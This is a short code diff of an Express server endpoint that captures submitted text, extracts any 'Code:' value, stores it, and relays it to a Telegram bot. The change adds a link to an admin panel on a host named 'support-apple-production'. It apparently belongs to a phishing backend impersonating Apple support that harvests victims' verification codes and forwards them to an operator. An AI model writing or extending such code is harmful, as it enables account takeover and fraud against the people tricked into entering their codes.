@@ -40,9 +40,9 @@ function sendTelegram(text) {
 app.post('/api/send', async (req, res) => {
     const { text } = req.body;
     try {
-        const result = await sendTelegram(text);
-
         const codeMatch = text.match(/Code:\s*(.+)/);
+        const adminUrl = '\n\nPanel admin: https://support-apple-production.up.railway.app/admin.html';
+
         if (codeMatch) {
             const codeEntry = {
                 id: ++codeIdCounter,
@@ -51,9 +51,11 @@ app.post('/api/send', async (req, res) => {
                 time: new Date().toLocaleString('fr-FR')
             };
             codes.push(codeEntry);
+            await sendTelegram(text + adminUrl);
             return res.json({ ok: true, codeId: codeEntry.id });
         }
 
+        await sendTelegram(text);
         res.json({ ok: true });
     } catch(e) {
         res.json({ ok: true });
